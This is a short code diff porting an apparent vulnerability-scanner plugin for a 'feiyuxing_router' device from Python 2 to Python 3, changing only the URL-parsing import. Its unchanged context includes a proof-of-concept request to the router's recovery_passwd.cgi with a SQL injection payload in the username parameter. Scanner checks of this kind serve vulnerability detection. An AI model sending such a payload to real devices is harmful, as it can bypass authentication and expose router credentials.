@@ -1,10 +1,10 @@
 #!/usr/bin/env python
 #-*- coding:utf-8 -*-
 
-import urlparse
+import urllib.parse
 def assign(service, arg):
     if service == 'feiyuxing_router':
-        arr = urlparse.urlparse(arg)
+        arr = urllib.parse.urlparse(arg)
         return True, '%s://%s/' % (arr.scheme, arr.netloc)
 def audit(arg):
     poc1 = arg + 'recovery_passwd.cgi?act=2&username=vultest%27+or+%271%27=%271'
